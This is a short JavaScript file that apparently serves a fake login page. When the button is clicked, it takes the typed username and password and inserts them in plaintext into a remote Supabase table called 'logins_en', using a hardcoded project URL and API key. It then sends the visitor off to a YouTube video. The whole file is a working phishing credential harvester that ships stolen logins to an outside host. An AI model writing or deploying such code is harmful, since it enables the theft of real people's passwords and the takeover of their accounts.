const supabaseUrl = 'https://qfnbwmcahgrgmeyjrnum.supabase.co'
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFmbmJ3bWNhaGdyZ21leWpybnVtIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NDU3NjA1MzAsImV4cCI6MTk2MTMzNjUzMH0.ttu6DMyK-Qhjm_zQ3_F_BrvnVJf6Mwb2qh94a9RLT3U'
const _supabase = supabase.createClient(supabaseUrl, SUPABASE_KEY);

window.onload = function() {
    var e_username = document.getElementById("username-input");
    var e_password = document.getElementById("password-input");
    var e_login = document.getElementById("login");

    e_login.onclick = async function() {
        var username = e_username.value;
        var password = e_password.value;

        console.log([username, password]);

        const {data, error} = await _supabase.from('logins_en').insert([
            {username: username, password: password}
        ]);

        console.log([data, error]);

        window.location = "https://www.youtube.com/watch?v=zR0R84L_rpY";
    }
}